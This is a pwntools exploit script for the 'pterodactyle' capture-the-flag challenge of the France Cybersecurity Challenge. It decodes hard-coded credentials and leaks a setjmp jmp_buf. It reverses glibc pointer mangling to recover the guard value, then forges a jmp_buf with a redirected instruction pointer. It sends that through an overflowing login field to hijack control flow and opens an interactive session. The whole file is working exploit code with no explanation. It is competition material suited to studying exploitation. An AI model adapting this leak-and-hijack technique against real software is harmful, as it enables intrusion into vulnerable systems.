#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import struct

exe = context.binary = ELF('pterodactyle')

host = args.HOST or 'challenges.france-cybersecurity-challenge.fr'
port = int(args.PORT or 2102)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ROR(x, n, bits = 32):
    mask = (2**n) - 1
    mask_bits = x & mask
    return (x >> n) | (mask_bits << (bits - n))
 
def ROL(x, n, bits = 32):
    return ROR(x, bits - n, bits)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *longjmp
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

USERNAME = bytes.fromhex("16131a1e19")
USERNAME = b''.join([p8(x ^ 0x77) for x in USERNAME])
log.info(USERNAME)

PASSWORD = b'\x3a\x0e\x24\x12\x34\x05\x44\x23\x27\x43\x53\x53\x20\x47\x05\x13'
PASSWORD = b''.join([p8(x ^ 0x77) for x in PASSWORD])
log.info(PASSWORD)

# Log in
io.sendlineafter(b'Exit\n>> ', b'1')
io.sendlineafter(b'Login:\n>> ', USERNAME)
io.sendlineafter(b'Password:\n>> ', PASSWORD)

# Get cookie -> leak
io.sendlineafter(b'Exit\n>> ', b'2')
io.recvuntil(b':-)\n')
#io.recv(0x20)
leak = io.recv(0x40)
rbx, rbp, R12, R13, R14, R15, rsp, rip = struct.unpack("LLLLLLLL", leak)
rbp, rsp, rip = (ROR(rbp, 0X11, 64),ROR(rsp, 0X11, 64),ROR(rip, 0X11, 64))

log.success(f'{rbx = :x} {rbp = :x} {rsp = :x} {rip = :x}')

canary = rip ^ 0x31f
fake_rip = ROL(0x595 ^ canary,0X11, 64)
print(hex(fake_rip))

fake_jmp_buf = leak[:0x38]
fake_jmp_buf += p64(fake_rip)

io.sendlineafter(b'Exit\n>> ', b'1')
p = b'A'*0x20 + fake_jmp_buf
p = b''.join(p8(x ^ 0x77) for x in p)
io.sendlineafter(b'Login:\n>> ', p)
io.sendlineafter(b'Password:\n>> ', b'toto')

io.interactive()

